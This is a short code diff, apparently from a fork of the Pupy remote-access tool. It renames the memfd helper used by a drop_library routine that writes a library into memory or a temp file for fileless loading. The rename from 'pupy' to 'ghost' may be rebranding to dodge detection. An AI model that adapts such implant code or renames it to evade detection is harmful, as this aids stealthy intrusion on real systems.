@@ -118,7 +118,7 @@ const char *gettemptpl() {
 
 int drop_library(char *path, size_t path_size, const char *buffer, size_t size) {
 #if defined(Linux)
-    int fd = pupy_memfd_create(path, path_size);
+    int fd = ghost_memfd_create(path, path_size);
     bool memfd = true;
 #elif defined(SunOS)
     char tmp[PATH_MAX] = {};
@@ -132,7 +132,7 @@ int drop_library(char *path, size_t path_size, const char *buffer, size_t size) 
 #endif
 
     if (fd < 0) {
-        dprint("pupy_memfd_create() failed: %m\n");
+        dprint("ghost_memfd_create() failed: %m\n");
         memfd = false;
 
         const char *template = gettemptpl();
